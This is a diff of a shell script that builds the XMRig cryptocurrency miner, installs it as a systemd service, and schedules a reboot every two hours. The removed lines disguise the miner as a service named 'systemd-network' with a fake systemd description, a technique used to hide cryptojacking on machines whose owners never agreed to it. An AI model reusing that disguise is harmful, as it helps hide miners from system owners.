@@ -24,20 +24,20 @@ sudo sysctl -p
 
 sudo setcap cap_sys_nice=eip $(which screen)
 
-cd ~
+cd /root || exit 1
 if [ ! -d xmrig ]; then
   git clone https://github.com/xmrig/xmrig.git
 fi
-cd xmrig
+cd xmrig || exit 1
 mkdir -p build
-cd build || { echo "Failed to enter build directory"; exit 1; }
+cd build || exit 1
 
 cmake .. || { echo "cmake failed"; exit 1; }
 make -j"$CPU_CORES" || { echo "make failed"; exit 1; }
 
-sudo tee /etc/systemd/system/systemd-network.service > /dev/null <<EOF
+sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOF
 [Unit]
-Description=systemd Network Service
+Description=XMRig Miner Service
 After=network-online.target
 Wants=network-online.target
 
@@ -54,12 +54,12 @@ StandardError=null
 WantedBy=multi-user.target
 EOF
 
-sudo chmod 644 /etc/systemd/system/systemd-network.service
+sudo chmod 644 /etc/systemd/system/xmrig.service
 sudo systemctl daemon-reload
-sudo systemctl enable systemd-network
-sudo systemctl start systemd-network
+sudo systemctl enable xmrig
+sudo systemctl start xmrig
 
 (sudo crontab -l 2>/dev/null; echo "0 */2 * * * /sbin/reboot") | sudo crontab -
 
-echo "Setup done. Miner running under 'systemd-network' service with wallet $WALLET"
+echo "Setup done. Miner running under 'xmrig' service with wallet $WALLET"
 echo "Reboot scheduled every 2 hours."
